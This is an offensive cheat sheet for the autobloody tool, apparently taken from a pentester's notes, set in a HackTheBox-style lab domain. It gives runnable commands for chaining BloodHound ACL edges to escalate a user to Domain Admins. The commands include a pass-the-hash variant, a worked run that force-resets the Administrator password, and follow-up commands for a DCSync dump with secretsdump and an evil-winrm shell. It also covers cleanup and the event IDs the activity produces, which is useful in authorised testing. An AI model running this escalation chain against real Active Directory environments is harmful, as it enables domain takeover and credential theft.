---
title: "Autobloody"
description: "autobloody automates BloodyAD privilege-escalation paths from a BloodHound/Neo4j graph, chaining the ACL edges end-to-end to reach a target principal."
category: active-directory
subcategory: "Tooling & Recon"
tags: [active-directory, ldap, acl-abuse]
tools: [autobloody, BloodyAD, BloodHound, Neo4j]
difficulty: intermediate
updated: "2026-08-11"
source: "vault:ActiveDirectory/Autobloody.md"
---

# Autobloody

**autobloody** automates the privilege-escalation path BloodHound already draws for you. Point it at an owned start principal and a target, and it computes the cheapest route through the graph in Neo4j, then walks that route edge-by-edge, firing each ACL write through **bloodyAD** until the target is yours — one command instead of a dozen manual `bloodyAD` calls. Reach for it when BloodHound shows a clean multi-hop chain of *writable* edges you want executed end-to-end; drive bloodyAD by hand (see the BloodyAD sheet) when you want a single edge, need to cherry-pick or pause between steps, or the path crosses a non-writable edge (`AdminTo`, `HasSession`, `CanRDP`) that autobloody cannot traverse.

> **Example lab (swap these constants) —** `--host dc01.sequel.htb` / `10.10.11.51` (DC) · `-d sequel.htb` (domain) · `-u ryan` · `-p 'Passw0rd!'` (you) · Neo4j at `bolt://localhost:7687` with `-du neo4j` `-dp 'neo4jpass'` · BloodHound nodes are UPPERCASE `NAME@DOMAIN`, e.g. start `RYAN@SEQUEL.HTB` → target `DOMAIN ADMINS@SEQUEL.HTB`. Every command is written in full.

## 1. How It Works

autobloody runs in two stages from a single invocation: it plans over the graph, then executes over LDAP.

```text
   owned start (-ds)                                 target (-dt)
   RYAN@SEQUEL.HTB                          DOMAIN ADMINS@SEQUEL.HTB
        │                                              ▲
        ▼                                              │
 ┌───────────────────────────────────────────────────────────────┐
 │ STAGE 1 — Neo4j pathfinding (Dijkstra; GDS if installed)       │
 │   weighted shortest path over WRITABLE ACL edges only          │
 │   → ordered edge list, e.g. AddSelf → GenericAll → MemberOf    │
 └───────────────────────────────────────────────────────────────┘
        │  ordered edge list
        ▼
 ┌───────────────────────────────────────────────────────────────┐
 │ STAGE 2 — bloodyAD execution (LDAP/LDAPS to --host DC)         │
 │   prompt to confirm  →  walk each edge, write it               │
 │   (skip the prompt with -y)                                    │
 │   on completion: auto-rollback the reversible writes           │
 └───────────────────────────────────────────────────────────────┘
```

Stage 1 never touches the DC — it is pure Neo4j math over the BloodHound graph, so the source and target you pass are Neo4j node labels, not live AD objects. Stage 2 authenticates to the DC as your start principal and performs the real writes.

> **Note — Automatic rollback is partial.** On completion autobloody reverts the writes it can — group adds, DACL grants, shadow-credential writes — but per the README it "clean[s] what is reversible (everything except `ForcePasswordChange` and `setOwner`)." A password reset and an ownership takeover are left in place. There is **no** `--no-rollback` flag in v1.1.0; the only user-facing control is `-y`/`--yes`, which skips the pre-apply confirmation prompt (rollback still runs afterwards).

## 2. Install

autobloody is on PyPI (v1.1.0, Oct 2025). It pulls in `bloodyAD` and the `neo4j` driver automatically.

**pipx (isolates deps):**

```bash
pipx install autobloody
```

**pip:**

```bash
pip install autobloody
```

**From source:**

```bash
git clone --depth 1 https://github.com/CravateRouge/autobloody && cd autobloody && pip install .
```

> **Note — Neo4j is a hard prerequisite.** autobloody plans over a running Neo4j that already holds BloodHound-ingested data. Install the Neo4j **GDS** (Graph Data Science) library for markedly faster pathfinding on large graphs. See section 3.

## 3. Prerequisites & Setup

Three things must be true before autobloody can plan and execute: Neo4j is up with the graph loaded, the start/target labels exist in that graph, and you actually hold the start principal's credentials.

**1. Start Neo4j:**

```bash
sudo neo4j start
```

**2. Collect and ingest the graph (bloodhound-python → BloodHound → Neo4j):**

```bash
bloodhound-python -d sequel.htb -u ryan -p 'Passw0rd!' -ns 10.10.11.51 -c All --zip
```

**3. Confirm the exact node labels exist (labels are case-sensitive):**

```bash
cypher-shell -a bolt://localhost:7687 -u neo4j -p 'neo4jpass' "MATCH (n) WHERE n.name IN ['RYAN@SEQUEL.HTB','DOMAIN ADMINS@SEQUEL.HTB'] RETURN n.name"
```

**4. (Optional) Mark the start node Owned:**

```bash
cypher-shell -a bolt://localhost:7687 -u neo4j -p 'neo4jpass' "MATCH (n {name:'RYAN@SEQUEL.HTB'}) SET n.owned = true"
```

Marking the start Owned is good BloodHound hygiene, but v1.1.0 selects the start explicitly with `-ds`, so the Owned flag is not strictly required — the label just has to exist and match. You must supply the start principal's own creds (`-u`/`-p`, `-k`, or `-c`): bloodyAD performs every write *as that identity*, so if `-ds` is `RYAN@SEQUEL.HTB` you authenticate as `ryan`.

> **Warning — BloodHound CE vs legacy is not turnkey.** autobloody queries a Neo4j graph in the **legacy** BloodHound schema, and the README only hints at CE support via a *separate repository/branch*. Treat CE as conditional: ingest with legacy BloodHound for the main tool, and always verify your labels resolve with the `cypher-shell` check above before trusting a "no path" result.

## 4. Authentication

The auth block is bloodyAD's, plus the three required DB flags (`-ds`, `-dt`, `-dp`) on every line so each command is runnable as-is. Pick the line matching your creds.

**Cleartext password:**

```bash
autobloody -d sequel.htb -u ryan -p 'Passw0rd!' --host dc01.sequel.htb -dp 'neo4jpass' -ds 'RYAN@SEQUEL.HTB' -dt 'DOMAIN ADMINS@SEQUEL.HTB'
```

**Pass-the-Hash (`LMHASH:NTHASH`):**

```bash
autobloody -d sequel.htb -u ryan -p 'aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4' --host dc01.sequel.htb -dp 'neo4jpass' -ds 'RYAN@SEQUEL.HTB' -dt 'DOMAIN ADMINS@SEQUEL.HTB'
```

**Kerberos with an existing ccache:**

```bash
export KRB5CCNAME=/home/kali/ryan.ccache
autobloody -k -d sequel.htb -u ryan --host dc01.sequel.htb -dp 'neo4jpass' -ds 'RYAN@SEQUEL.HTB' -dt 'DOMAIN ADMINS@SEQUEL.HTB'
```

**Kerberos, request the TGT from a password:**

```bash
autobloody -k -d sequel.htb -u ryan -p 'Passw0rd!' --host dc01.sequel.htb -dp 'neo4jpass' -ds 'RYAN@SEQUEL.HTB' -dt 'DOMAIN ADMINS@SEQUEL.HTB'
```

**LDAPS (TLS) — prefer this so writes aren't cleartext:**

```bash
autobloody -s -d sequel.htb -u ryan -p 'Passw0rd!' --host dc01.sequel.htb -dp 'neo4jpass' -ds 'RYAN@SEQUEL.HTB' -dt 'DOMAIN ADMINS@SEQUEL.HTB'
```

**Certificate (Schannel client-cert over LDAPS):**

```bash
autobloody -s -c 'ryan_key.pem:ryan_cert.pem' -d sequel.htb -u ryan --host dc01.sequel.htb -dp 'neo4jpass' -ds 'RYAN@SEQUEL.HTB' -dt 'DOMAIN ADMINS@SEQUEL.HTB'
```

`-c` selects certificate auth; its value is bloodyAD's `key:cert` pair (PEM key, then cert). Confirm the exact order/separator with `autobloody -h` if auth fails.

**Kerberos over LDAPS, wrapped in faketime to defeat DC clock skew:**

```bash
faketime "$(ntpdate -q dc01.sequel.htb | cut -d ' ' -f 1,2)" autobloody -k -s -d sequel.htb -u ryan -p 'Passw0rd!' --host dc01.sequel.htb -dp 'neo4jpass' -ds 'RYAN@SEQUEL.HTB' -dt 'DOMAIN ADMINS@SEQUEL.HTB'
```

> **Warning — Kerberos clock skew.** `-k` throwing `KRB_AP_ERR_SKEW`? Wrap the whole command in faketime, exactly as with bloodyAD:
> ```bash
> faketime -f '+7h30m' autobloody -k -d sequel.htb -u ryan --host dc01.sequel.htb -dp 'neo4jpass' -ds 'RYAN@SEQUEL.HTB' -dt 'DOMAIN ADMINS@SEQUEL.HTB'
> ```

## 5. Flag Reference

autobloody's own flags drive Neo4j and the run; the rest are bloodyAD's auth flags, inherited verbatim.

### autobloody & Neo4j flags

| Flag | Meaning |
| :-- | :-- |
| `-ds`, `--dbsource` | Case-sensitive BloodHound label of the owned **start** node, e.g. `RYAN@SEQUEL.HTB` (required; replaces the old `--setstart`) |
| `-dt`, `--dbtarget` | Case-sensitive BloodHound label of the **target** node, e.g. `DOMAIN ADMINS@SEQUEL.HTB` (required; replaces the old `--settarget`) |
| `-dp`, `--dbpassword` | Neo4j password (required) |
| `-du`, `--dbuser` | Neo4j username (default `neo4j`) |
| `--dburi` | Neo4j Bolt URI (default `bolt://localhost:7687`) |
| `-y`, `--yes` | Auto-apply the path — skip the pre-apply confirmation prompt |
| `-v` / `-vv` | Verbosity: `-v` = INFO, `-vv` = DEBUG (count-based; replaces the old `-v {QUIET,INFO,DEBUG}`) |
| `--timeout` | Connection timeout in seconds (default `60`) |
| `-h`, `--help` | Show help and exit |

### Inherited bloodyAD auth flags

| Flag | Meaning |
| :-- | :-- |
| `--host` | DC hostname **or** IP (required) — there is no separate `--dc-ip` |
| `-d`, `--domain` | Domain for NTLM auth |
| `-u`, `--username` | Controlled start principal |
| `-p`, `--password` | Cleartext password or `LMHASH:NTHASH` |
| `-k`, `--kerberos` | Kerberos auth (wrap in faketime on clock skew) |
| `-c`, `--certificate` | Certificate-based auth; value is bloodyAD's `key:cert` pair (verify exact order/separator with `autobloody -h`) |
| `-s`, `--secure` | LDAP over TLS (LDAPS) |

> **Note — The old interface changed.** v1.1.0 renamed start/target to `-ds`/`-dt` (case-sensitive labels), made verbosity count-based (`-v`/`-vv`), and **removed `--no-rollback`** — rollback is now automatic and partial (section 10). `--host` takes a hostname or an IP; there is no `--dc-ip`.

## 6. Core Usage

One command computes the path and executes it. Start from the canonical form and add flags as needed.

**Canonical one-liner — start → target, all DB constants explicit:**

```bash
autobloody -d sequel.htb -u ryan -p 'Passw0rd!' --host dc01.sequel.htb --dburi bolt://localhost:7687 -du neo4j -dp 'neo4jpass' -ds 'RYAN@SEQUEL.HTB' -dt 'DOMAIN ADMINS@SEQUEL.HTB'
```

**Verbose — watch each edge fire (DEBUG):**

```bash
autobloody -d sequel.htb -u ryan -p 'Passw0rd!' --host dc01.sequel.htb -dp 'neo4jpass' -ds 'RYAN@SEQUEL.HTB' -dt 'ADMINISTRATOR@SEQUEL.HTB' -vv
```

**Auto-apply — skip the confirmation prompt (closest thing to the retired `--no-rollback`, but rollback still runs):**

```bash
autobloody -d sequel.htb -u ryan -p 'Passw0rd!' --host dc01.sequel.htb -dp 'neo4jpass' -ds 'RYAN@SEQUEL.HTB' -dt 'ADMINISTRATOR@SEQUEL.HTB' -y -vv
```

**Non-default Neo4j host + longer timeout for a large graph:**

```bash
autobloody -d sequel.htb -u ryan -p 'Passw0rd!' --host dc01.sequel.htb --dburi bolt://127.0.0.1:7687 -du neo4j -dp 'neo4jpass' --timeout 120 -ds 'RYAN@SEQUEL.HTB' -dt 'ADMINISTRATOR@SEQUEL.HTB'
```

Default behaviour prompts once, after printing the path, before any write — read the plan, then confirm. `-y` removes that gate, so use it only when you have already reviewed the path and accept that a `ForceChangePassword`/`setOwner` hop will persist.

> **Warning — `-y` fires writes with no prompt.** With `-y` autobloody executes the whole path immediately. If the cheapest path runs through a password reset on a real account, that account's password changes for good (rollback won't restore it). On an engagement, review the path first and coordinate before auto-applying.

## 7. Worked Example — RYAN → Domain Admins

Escalate `ryan` to Domain Admins on a sequel.htb-style box. autobloody finds the path, you confirm, it walks each edge, then it rolls back what it can.

**1. Run it (verbose so the plan and each edge are visible):**

```bash
autobloody -d sequel.htb -u ryan -p 'Passw0rd!' --host dc01.sequel.htb -dp 'neo4jpass' -ds 'RYAN@SEQUEL.HTB' -dt 'DOMAIN ADMINS@SEQUEL.HTB' -v
```

Output (illustrative):

```text
[*] Neo4j: connected to bolt://localhost:7687
[*] Pathfinding RYAN@SEQUEL.HTB -> DOMAIN ADMINS@SEQUEL.HTB
[+] Shortest path found — 3 edges, total cost 3.0:
      RYAN@SEQUEL.HTB
        --(AddSelf)-->       MANAGEMENT@SEQUEL.HTB
        --(GenericAll)-->    ADMINISTRATOR@SEQUEL.HTB
        --(MemberOf)-->      DOMAIN ADMINS@SEQUEL.HTB
[?] Execute this path against dc01.sequel.htb? [y/N] y
[*] 1/3  AddSelf       -> add RYAN to MANAGEMENT@SEQUEL.HTB
[+]      RYAN is now a member of MANAGEMENT
[*] 2/3  GenericAll    -> ForceChangePassword on ADMINISTRATOR@SEQUEL.HTB
[+]      ADMINISTRATOR password set to: aUtoBl00dy_9f3c!
[*] 3/3  MemberOf      -> ADMINISTRATOR already in DOMAIN ADMINS (no write)
[+] Target reached: RYAN -> DOMAIN ADMINS via ADMINISTRATOR
[*] Rolling back reversible writes...
[+]      reverted AddSelf: removed RYAN from MANAGEMENT
[!]      kept ForceChangePassword on ADMINISTRATOR (not reversible)
[*] Done in 4.1s
```

**2. Authenticate as the target.** The group add was rolled back, but the password reset was not — so your foothold is Administrator's new password. Validate it:

```bash
netexec smb 10.10.11.51 -u administrator -p 'aUtoBl00dy_9f3c!'
```

**3. Dump the domain (DCSync):**

```bash
secretsdump.py sequel.htb/administrator:'aUtoBl00dy_9f3c!'@10.10.11.51
```

**4. Or take an interactive shell:**

```bash
evil-winrm -i dc01.sequel.htb -u administrator -p 'aUtoBl00dy_9f3c!'
```

> **Warning — The lasting change is the one it can't undo.** In this run the durable access comes from the irreversible `ForceChangePassword`, not the rolled-back group add. That reset **breaks Administrator's real password** — note the original/DR where you can, and prefer a reversible edge (shadow credentials via bloodyAD by hand) when stealth or account continuity matters.

## 8. Pathfinding — Executable Edges

autobloody only walks edges bloodyAD can turn into an LDAP write. If Stage 1's cheapest path relies on a non-writable edge, autobloody cannot execute it — you bridge that hop by hand, then re-run from the new node.

| BloodHound edge | autobloody | Why |
| :-- | :-- | :-- |
| `GenericAll` / `GenericWrite` | executes | DACL / attribute write |
| `WriteDacl` / `WriteOwner` / `Owns` | executes | rewrite DACL / take ownership (`setOwner` not rolled back) |
| `ForceChangePassword` | executes | password reset (not rolled back) |
| `AddMembers` / `AddSelf` / `MemberOf` | executes | group `member` write |
| `AllExtendedRights` | executes | extended-rights write |
| `DCSync` (`GetChanges` / `GetChangesAll`) | executes | grant / replicate secrets |
| `Contains` | executes | container write |
| `ReadGMSAPassword` | executes | read the managed password |
| `AdminTo` / `HasSession` | skipped | host-level, not a directory ACL |
| `CanRDP` / `CanPSRemote` / `ExecuteDCOM` | skipped | access right, no LDAP primitive |
| `SQLAdmin` / `HasSIDHistory` / `GPLink` | skipped | no bloodyAD write for it |

To fire any single edge by hand — or to bridge a `skipped` hop before re-running — use the ACL Edge Playbook in the BloodyAD sheet, which maps each BloodHound edge to the exact `bloodyAD` command.

## 9. Troubleshooting

Most failures are Neo4j, labels, or the clock — in that order.

**Neo4j connection refused / auth failure.** Confirm the service is up and the Bolt URI and creds are right; test independently:

```bash
cypher-shell -a bolt://localhost:7687 -u neo4j -p 'neo4jpass' "RETURN 1"
```

Pass a non-default location with `--dburi`, `-du`, `-dp`; raise `--timeout` on a slow or large DB.

**"No path found" / empty result.** Almost always the labels. `-ds`/`-dt` are **case-sensitive** and must match BloodHound exactly — UPPERCASE `NAME@DOMAIN`, groups spelled in full (`DOMAIN ADMINS@SEQUEL.HTB`). Verify:

```bash
cypher-shell -a bolt://localhost:7687 -u neo4j -p 'neo4jpass' "MATCH (n {name:'DOMAIN ADMINS@SEQUEL.HTB'}) RETURN n.name"
```

If the labels are right and there is still no path, no *all-writable* route exists — every candidate path leans on a non-executable edge (section 8). Widen collection (`-c All`) and re-ingest, or bridge the missing hop manually.

**Kerberos `KRB_AP_ERR_SKEW`.** DC clock skew. Wrap the run in faketime:

```bash
faketime "$(ntpdate -q dc01.sequel.htb | cut -d ' ' -f 1,2)" autobloody -k -d sequel.htb -u ryan --host dc01.sequel.htb -dp 'neo4jpass' -ds 'RYAN@SEQUEL.HTB' -dt 'DOMAIN ADMINS@SEQUEL.HTB'
```

**A path step "cannot be exploited".** Stage 1 handed Stage 2 an edge bloodyAD can't write (e.g. `AdminTo`). autobloody stops at that hop. Perform it out-of-band — pivot onto the host, or use the sibling technique — then re-run autobloody with `-ds` set to the node you now control.

## 10. OPSEC & Cleanup

autobloody's writes are bloodyAD's writes; they generate the same directory events, and its rollback is automatic but incomplete. The event IDs below are general, indicative AD telemetry — not autobloody-specific — and exact IDs vary; group-membership events in particular depend on group scope (e.g. `4728` global, `4756` universal, `4732` domain-local).

> **Warning — Reverse what autobloody won't.** Rollback runs by default and undoes reversible writes (group adds, DACL grants, shadow-cred links), but per the README it cleans only what is reversible — everything except the `ForcePasswordChange` and `setOwner` operations. In BloodHound terms that leaves the `ForceChangePassword` password reset and any ownership takeover in place. After any run that used those edges, clean up by hand: restore/reset the password to an agreed value and hand ownership back with `bloodyAD set owner`. There is no `--no-rollback`; `-y` only skips the prompt.

| Action (edge) | Log | Noise |
| :-- | :-- | :-- |
| DACL / owner write (`GenericAll`/`WriteDacl`/`WriteOwner`/`Owns`) | 5136 / 4662 | Medium |
| Shadow-cred write (`GenericWrite`/`GenericAll` on a user) | 5136 (`msDS-KeyCredentialLink`) | Medium |
| Password reset (`ForceChangePassword`) — not rolled back | 4724 / 4738 | High |
| Group add (`AddMembers`/`AddSelf`) | 4728 / 4756 (scope-dependent) | Medium |
| DCSync grant on the domain | 5136 on domain object | High |
| Stage-1 pathfinding (Neo4j, local) | none on the DC | None |

Prefer `-s` (LDAPS) so the writes aren't in cleartext, keep the confirmation prompt (don't reflexively `-y`) so you can bail before an irreversible hop, and remember Stage 1 is entirely local — nothing hits the DC until you confirm the plan.

## Sources

- autobloody (CravateRouge): https://github.com/CravateRouge/autobloody
- autobloody on PyPI: https://pypi.org/project/autobloody/
- BloodyAD Wiki: https://github.com/CravateRouge/bloodyAD/wiki/User-Guide
- Kali tool page (bloodyAD): https://www.kali.org/tools/bloodyad/
- BloodHound-CE docs: https://bloodhound.specterops.io/
